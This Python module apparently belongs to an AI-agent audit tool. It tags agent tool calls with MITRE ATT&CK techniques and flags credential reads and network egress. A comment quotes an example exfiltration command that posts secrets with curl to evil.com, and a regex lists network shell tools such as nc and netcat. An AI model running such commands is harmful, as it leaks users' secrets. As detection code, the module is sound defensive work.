"""MITRE ATT&CK mapping for agent tool activity.

Two layers:
  1. Tool -> technique: what kind of action the tool performs (by tool name).
  2. Content upgrade: if the evidence (command / arguments) touches a sensitive
     target, upgrade to a higher-signal technique — e.g. reading a private key
     is Credential Access (T1552), not generic Collection (T1005). This is the
     signal a SOC actually pays for; it only fires on the Tier B path where the
     command/args are available (Tier A stores hashes only).

Structured IDs are stored so a SIEM can pivot on `technique_id`; human labels
stay for display.
"""

from __future__ import annotations

import json
import re
from typing import Any


def _m(tactic_id: str, tactic: str, technique_id: str, technique: str) -> dict[str, str]:
    return {
        "tactic_id": tactic_id,
        "tactic": tactic,
        "technique_id": technique_id,
        "technique": technique,
    }


def _norm(name: str) -> str:
    """Fold a tool method to a comparable key.

    IDE agents spell the same action three different ways — Cursor ships
    `SearchAndReplace`, Claude ships `WebFetch`, our drivers ship `read_file`.
    Dropping case and separators means one entry covers all spellings; without
    this, `web_search` matched but `WebSearch` silently did not, and an unmapped
    network call means the credential-exfil rule can never fire.
    """
    return name.lower().replace("_", "").replace("-", "")


_EXECUTION = _m("TA0002", "Execution", "T1059", "Command and Scripting Interpreter")
_COLLECTION = _m("TA0009", "Collection", "T1005", "Data from Local System")
_DISCOVERY = _m("TA0007", "Discovery", "T1083", "File and Directory Discovery")
_MANIPULATION = _m("TA0040", "Impact", "T1565", "Data Manipulation")
_DESTRUCTION = _m("TA0040", "Impact", "T1485", "Data Destruction")
_C2 = _m("TA0011", "Command and Control", "T1071.001", "Web Protocols")

# Normalized tool method -> technique. Keys are _norm()'d at build time.
_TOOL_MAP: dict[str, dict[str, str]] = {
    _norm(k): v
    for k, v in {
        # Execution
        "run_command": _EXECUTION,
        "run_terminal_cmd": _EXECUTION,
        "run": _EXECUTION,  # shell.run
        "run_shell": _EXECUTION,  # opensre
        "shell": _EXECUTION,
        "shell_exec": _EXECUTION,
        "execute_command": _EXECUTION,
        "exec": _EXECUTION,
        "terminal": _EXECUTION,
        "bash": _m("TA0002", "Execution", "T1059.004", "Unix Shell"),
        "powershell": _m("TA0002", "Execution", "T1059.001", "PowerShell"),
        # Collection
        "read_file": _COLLECTION,
        "read_note": _COLLECTION,
        "view_file": _COLLECTION,
        "read": _COLLECTION,
        "grep_search": _COLLECTION,
        "grep": _COLLECTION,
        "codebase_search": _COLLECTION,
        "search": _COLLECTION,
        # Discovery
        "list_dir": _DISCOVERY,
        "glob": _DISCOVERY,
        "ls": _DISCOVERY,
        "find": _DISCOVERY,
        # Impact / Manipulation
        "write_file": _MANIPULATION,
        "write_to_file": _MANIPULATION,
        "write": _MANIPULATION,
        "edit_file": _MANIPULATION,
        "edit": _MANIPULATION,
        "multi_edit": _MANIPULATION,  # Claude MultiEdit
        "search_and_replace": _MANIPULATION,  # Cursor SearchAndReplace
        "notebook_edit": _MANIPULATION,
        "replace_file_content": _MANIPULATION,
        "multi_replace_file_content": _MANIPULATION,
        # Impact / Destruction — the highest-severity impact; must not be missed.
        "delete_file": _DESTRUCTION,
        "delete": _DESTRUCTION,  # cursor.Delete
        "remove": _DESTRUCTION,
        # Command & Control / network egress. TA0011 here is what lets the
        # credential-exfil sequence rule fire, so keep this list generous.
        "curl": _C2,
        "wget": _C2,
        "fetch": _C2,
        "web_fetch": _C2,  # Claude WebFetch
        "web_search": _C2,  # Claude WebSearch
        "http_request": _C2,
    }.items()
}

# Content upgrades — fire on evidence text, highest-signal first.
# (Exfil is a *sequence* signal — a read followed by network egress — and lives
#  in the detection rules, not in per-event tagging.)
_CREDENTIAL_ACCESS = _m("TA0006", "Credential Access", "T1552.001", "Credentials In Files")
_PRIVATE_KEY = _m("TA0006", "Credential Access", "T1552.004", "Private Keys")

# Credential and private-key recognition now lives in detection/traits.py, and
# this module imports it rather than keeping a second copy.
#
# It used to keep its own tuple of substrings matched with `p in text`. That is
# how `agentmetry.core.diagnostics.env_file` earned T1552.001 (#40): the tuple
# contained a bare ".env". Worse than the false positive was the shape of the
# bug. Two classifiers were answering "is this credential access" from
# different data -- `classify_command` said no traits, the mapper said
# T1552.001 -- and the sequence rules keyed off the mapper, the one with less
# information and no test corpus. A disagreement between them was not merely
# possible, it was undetectable.
from agentmetry.core.audit.detection.traits import (  # noqa: E402
    CREDENTIAL_ENV,
    CREDENTIAL_ENV_DUMP,
    CREDENTIAL_PATH,
    ENV_FILE,
    INTERPRETER_NETWORK,
    PRIVATE_KEY_PATH,
    mask_literals,
)

# Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
# network connection, so it is Command and Control, not merely Execution. The
# tool name alone cannot see this: the tool is "Bash", and the egress lives in
# the arguments. Without this, the most common exfil path (curl from a shell)
# never earns TA0011 and the credential-exfil sequence rule cannot fire.
#
# This tags a *fact* about one event (it talked to the network). Exfiltration
# itself stays a sequence signal, decided by the detection rules.
_NETWORK_CLIENT = re.compile(
    r"\b(curl|wget|iwr|invoke-webrequest|invoke-restmethod|nc|netcat|scp|rsync|ftp|telnet)\b"
)
_URL_HOST = re.compile(r"https?://(?:[^\s/@'\"]*@)?([^\s/:'\"]+)")
_BARE_IP = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
# Loopback is not egress. Hitting your own health endpoint is the single most
# common thing a developer does while running this tool, and tagging it
# Command and Control buries the one event that matters under a hundred that
# don't. Anything off the box still counts, including the LAN: exfil to the
# machine next to you is still exfil.
_LOOPBACK = re.compile(r"^(?:localhost|127(?:\.\d{1,3}){3}|0\.0\.0\.0|\[?::1\]?)$")
_C2 = _m("TA0011", "Command and Control", "T1071.001", "Web Protocols")


def _reaches_remote_host(text: str) -> bool:
    """True when the command names a target that is not this machine."""
    hosts = _URL_HOST.findall(text) + _BARE_IP.findall(text)
    return any(not _LOOPBACK.match(host) for host in hosts)


def _shell_text(evidence: Any) -> str | None:
    """The shell command inside `evidence`, or None if this is not shell text.

    Masking is a statement about *shell* quoting, and applying it to anything
    else is actively wrong. `_evidence_text` returns JSON for dict evidence,
    where the entire command sits inside double quotes -- masking that blanks
    the whole string and every content rule silently stops matching. A tool call
    carrying `{"path": "~/.aws/credentials"}` has no shell quoting to reason
    about either, and its quotes are JSON syntax rather than an author's intent.

    So: mask when we have a command, and only then.
    """
    if isinstance(evidence, str):
        return evidence
    if isinstance(evidence, dict):
        command = evidence.get("command")
        if isinstance(command, str) and command:
            return command
    return None


def _evidence_text(evidence: Any) -> str:
    if not evidence:
        return ""
    if isinstance(evidence, str):
        return evidence.lower()
    try:
        return json.dumps(evidence, default=str).lower()
    except Exception:
        return str(evidence).lower()


def get_mitre_mapping(
    tool_qualified: str, evidence: Any = None
) -> dict[str, str] | None:
    """Return the MITRE tactic/technique for a tool call.

    `evidence` (command string or args) is optional; when present it can upgrade
    the mapping to a higher-signal technique (credential access, exfil).
    """
    text = _evidence_text(evidence)

    # 1. Content upgrades win — a read that touches a key is credential access,
    #    not generic collection.
    if text:
        # Same masking policy as classify_command: paths may be double-quoted
        # and still be real, but a path inside single quotes or a heredoc is
        # text somebody is writing, not a file somebody is reading. Structured
        # evidence is not masked at all -- see _shell_text.
        shell = _shell_text(evidence)
        literal = mask_literals(shell, include_double=False).lower() if shell else text
        written = mask_literals(shell).lower() if shell else text
        if PRIVATE_KEY_PATH.search(literal):
            return _PRIVATE_KEY
        if (
            CREDENTIAL_PATH.search(literal)
            or ENV_FILE.search(literal)
            or CREDENTIAL_ENV.search(text)
            or CREDENTIAL_ENV_DUMP.search(written)
        ):
            return _CREDENTIAL_ACCESS
        # A shell that reaches the network is C2, whatever the tool is called.
        # An interpreter counts: `python -c "urllib.request.urlopen(...)"` is a
        # network client, and in a container it is often the only one installed.
        # INTERPRETER_NETWORK reads `literal`, not `written`: the payload of
        # `python -c "urllib.request.urlopen(...)"` is double-quoted and is the
        # program being run, so blanking it would hide the very thing being
        # matched. Single quotes and heredocs are still masked, which is what
        # keeps `echo 'python -c "urlopen"'` from firing.
        if _reaches_remote_host(text) and (
            _NETWORK_CLIENT.search(written) or INTERPRETER_NETWORK.search(literal)
        ):
            return _C2

    # 2. Tool-name mapping on the method segment (the part after the last '.'),
    #    normalized so Cursor/Claude/driver spellings all land on one entry.
    if not tool_qualified:
        return None
    method = _norm(tool_qualified.rsplit(".", 1)[-1])
    return _TOOL_MAP.get(method)


# Backwards-compatible alias for any callers importing the old name.
MITRE_MAPPINGS = _TOOL_MAP
